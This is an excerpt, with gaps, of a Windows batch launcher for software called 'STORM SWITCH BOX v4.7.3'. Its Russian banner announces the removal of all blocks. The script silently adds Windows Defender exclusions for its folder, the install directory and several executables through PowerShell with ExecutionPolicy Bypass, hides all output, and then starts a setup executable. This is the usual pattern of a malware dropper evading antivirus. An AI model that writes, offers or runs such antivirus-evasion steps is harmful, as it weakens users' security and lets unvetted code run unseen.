...
echo ============================================================
echo   STORM SWITCH BOX v4.7.3 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\STORM SWITCH BOX' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSwitchBox.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SWITCH_BOX_4.7.3_Setup.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormInstaller.exe' -ErrorAction SilentlyContinue" >nul 2>&1
...
:: ============================================================
echo.
echo [5/5] Запуск STORM SWITCH BOX v4.7.3...
echo.
echo ============================================================
...
if exist "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.7.3_Setup.exe" (
    start "" "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.7.3_Setup.exe"
) else if exist "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.7.3_Setup.exe" (
    start "" "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.7.3_Setup.exe"
) else if exist "%SCRIPT_DIR%STORM_SWITCH_BOX_4.7.3_Setup.exe" (
    start "" "%SCRIPT_DIR%STORM_SWITCH_BOX_4.7.3_Setup.exe"
